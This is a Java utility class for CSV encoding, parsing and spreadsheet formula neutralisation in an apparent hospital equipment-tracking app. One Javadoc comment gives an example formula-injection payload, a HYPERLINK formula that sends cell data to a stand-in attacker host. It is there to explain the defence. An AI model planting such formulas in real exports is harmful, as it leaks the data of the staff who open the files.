package com.medtrack.util;

import java.util.ArrayList;
import java.util.List;

/**
 * RFC 4180 CSV encoding and decoding, plus spreadsheet formula neutralisation.
 *
 * <p>Replaces the hand-rolled string handling in {@code EquipmentService}, which had three
 * defects:</p>
 *
 * <ul>
 *   <li><strong>The writer never quoted anything.</strong> Field values were concatenated with
 *       commas, so an asset named {@code "Ventilator, Portable"} produced eight fields under a
 *       seven-column header and shifted every subsequent column for that row. A {@code "} or a
 *       newline in any field corrupted the file structurally.</li>
 *   <li><strong>The parser dropped escaped quotes.</strong> It toggled a boolean on every
 *       {@code "} and never emitted the character, so the RFC 4180 escape {@code ""} toggled twice
 *       and vanished: {@code "Monitor 15"" Display"} parsed as {@code Monitor 15 Display}.</li>
 *   <li><strong>Neither side neutralised formulas.</strong> A value beginning {@code =}, {@code +},
 *       {@code -} or {@code @} is evaluated as a formula by Excel, LibreOffice and Google Sheets
 *       when the exported file is opened (CWE-1236).</li>
 * </ul>
 */
public final class CsvSupport {

    /** RFC 4180 mandates CRLF between records. */
    public static final String RECORD_SEPARATOR = "\r\n";

    /**
     * UTF-8 byte order mark.
     *
     * <p>Excel on Windows assumes the system ANSI code page for a {@code .csv} without one, so an
     * asset name containing any non-ASCII character renders as mojibake. Every other consumer
     * tolerates the BOM.</p>
     */
    public static final String UTF8_BOM = "﻿";

    /**
     * Characters that make a spreadsheet treat a cell as a formula.
     *
     * <p>Tab and carriage return are included because both are stripped by some spreadsheet
     * importers before the leading character is examined, which would re-expose the character
     * behind them.</p>
     */
    private static final String FORMULA_TRIGGERS = "=+-@\t\r";

    private CsvSupport() {
        // Static utility holder.
    }

    /**
     * Encodes one field: neutralises a leading formula trigger, then quotes and escapes as needed.
     *
     * @param value raw value; {@code null} becomes an empty field rather than the text "null"
     * @return the field, ready to be joined with commas
     */
    public static String encodeField(Object value) {
        if (value == null) {
            return "";
        }

        String text = neutraliseFormula(String.valueOf(value));

        boolean needsQuoting = text.indexOf(',') >= 0
                || text.indexOf('"') >= 0
                || text.indexOf('\n') >= 0
                || text.indexOf('\r') >= 0
                // Leading or trailing whitespace is otherwise silently trimmed by many readers.
                || (!text.isEmpty() && (Character.isWhitespace(text.charAt(0))
                        || Character.isWhitespace(text.charAt(text.length() - 1))));

        if (!needsQuoting) {
            return text;
        }

        return '"' + text.replace("\"", "\"\"") + '"';
    }

    /**
     * Encodes a full record, terminated with CRLF.
     *
     * @param values field values in column order
     * @return the encoded record
     */
    public static String encodeRow(Object... values) {
        StringBuilder row = new StringBuilder();
        for (int index = 0; index < values.length; index++) {
            if (index > 0) {
                row.append(',');
            }
            row.append(encodeField(values[index]));
        }
        return row.append(RECORD_SEPARATOR).toString();
    }

    /**
     * Prefixes a leading formula trigger with an apostrophe so spreadsheets treat the cell as text.
     *
     * <p>An equipment name is attacker-controllable by any authenticated {@code HOSPITAL} user, and
     * the export is opened by other staff. Without this, storing an asset as</p>
     *
     * <pre>=HYPERLINK("https://attacker.example/?d="&amp;A1,"Click")</pre>
     *
     * <p>writes a live formula into a file that another user opens.</p>
     *
     * <p>The apostrophe is the convention every major spreadsheet understands, and it is not part
     * of the CSV grammar, so a reader that is not a spreadsheet still sees the original text with
     * one leading character. That is a deliberate trade: a visible apostrophe is preferable to a
     * cell that executes.</p>
     *
     * @param value raw value
     * @return the value, made inert
     */
    public static String neutraliseFormula(String value) {
        if (value == null || value.isEmpty()) {
            return value;
        }
        if (FORMULA_TRIGGERS.indexOf(value.charAt(0)) >= 0) {
            return "'" + value;
        }
        return value;
    }

    /**
     * Reverses {@link #neutraliseFormula}, so a file this application exported can be re-imported
     * without accumulating apostrophes on every round trip.
     *
     * @param value field value as read from the file
     * @return the value with a neutralising apostrophe removed, if present
     */
    public static String denormaliseFormula(String value) {
        if (value != null && value.length() > 1
                && value.charAt(0) == '\''
                && FORMULA_TRIGGERS.indexOf(value.charAt(1)) >= 0) {
            return value.substring(1);
        }
        return value;
    }

    /**
     * Splits a whole CSV document into logical records, honouring newlines inside quoted fields.
     *
     * <p>Reading line by line is wrong for CSV and was the remaining half of the embedded-newline
     * defect: the writer quotes a field containing {@code \n} correctly, but a {@code readLine()}
     * loop then splits that single record across two, so the export was well-formed and the import
     * still could not read it back. A record boundary is only a line break encountered
     * <em>outside</em> quotes.</p>
     *
     * <p>A leading UTF-8 BOM is stripped here rather than at the call site, so it cannot end up
     * embedded in the first header name.</p>
     *
     * <p>The whole document is held in memory. Equipment inventories are small and the upload is an
     * already-buffered {@code MultipartFile}, so this is a deliberate trade for correctness; a
     * streaming record reader would be the answer if imports ever became large enough to matter.</p>
     *
     * @param csv full document text
     * @return logical records, blank ones omitted, without trailing line breaks
     */
    public static List<String> splitRecords(String csv) {
        List<String> records = new ArrayList<>();
        if (csv == null || csv.isEmpty()) {
            return records;
        }

        String text = csv.startsWith(UTF8_BOM) ? csv.substring(UTF8_BOM.length()) : csv;

        StringBuilder current = new StringBuilder();
        boolean inQuotes = false;

        for (int index = 0; index < text.length(); index++) {
            char character = text.charAt(index);

            if (character == '"') {
                // A doubled quote is an escaped literal and does not change quoting state.
                if (inQuotes && index + 1 < text.length() && text.charAt(index + 1) == '"') {
                    current.append('"').append('"');
                    index++;
                    continue;
                }
                inQuotes = !inQuotes;
                current.append(character);
                continue;
            }

            if (!inQuotes && (character == '\n' || character == '\r')) {
                // Consume CRLF as a single boundary.
                if (character == '\r' && index + 1 < text.length() && text.charAt(index + 1) == '\n') {
                    index++;
                }
                addIfNotBlank(records, current);
                continue;
            }

            current.append(character);
        }

        addIfNotBlank(records, current);
        return records;
    }

    private static void addIfNotBlank(List<String> records, StringBuilder current) {
        String record = current.toString();
        current.setLength(0);
        if (!record.isBlank()) {
            records.add(record);
        }
    }

    /**
     * Parses a single CSV record.
     *
     * <p>Handles quoted fields, embedded commas, and the {@code ""} escape for a literal quote.
     * Unquoted fields are trimmed, matching the previous behaviour; quoted fields are returned
     * verbatim, because quoting is how a caller says the whitespace is significant.</p>
     *
     * @param line one record, without its trailing line break
     * @return the fields, in order
     */
    public static List<String> parseLine(String line) {
        List<String> fields = new ArrayList<>();
        if (line == null) {
            return fields;
        }

        StringBuilder current = new StringBuilder();
        boolean inQuotes = false;
        boolean fieldWasQuoted = false;

        for (int index = 0; index < line.length(); index++) {
            char character = line.charAt(index);

            if (inQuotes) {
                if (character == '"') {
                    // A doubled quote inside a quoted field is a literal quote. The previous
                    // implementation toggled twice and emitted nothing, deleting the character.
                    if (index + 1 < line.length() && line.charAt(index + 1) == '"') {
                        current.append('"');
                        index++;
                    } else {
                        inQuotes = false;
                    }
                } else {
                    current.append(character);
                }
                continue;
            }

            if (character == '"') {
                inQuotes = true;
                fieldWasQuoted = true;
            } else if (character == ',') {
                fields.add(finishField(current, fieldWasQuoted));
                current.setLength(0);
                fieldWasQuoted = false;
            } else {
                current.append(character);
            }
        }

        fields.add(finishField(current, fieldWasQuoted));
        return fields;
    }

    private static String finishField(StringBuilder buffer, boolean wasQuoted) {
        String value = buffer.toString();
        return denormaliseFormula(wasQuoted ? value : value.trim());
    }
}
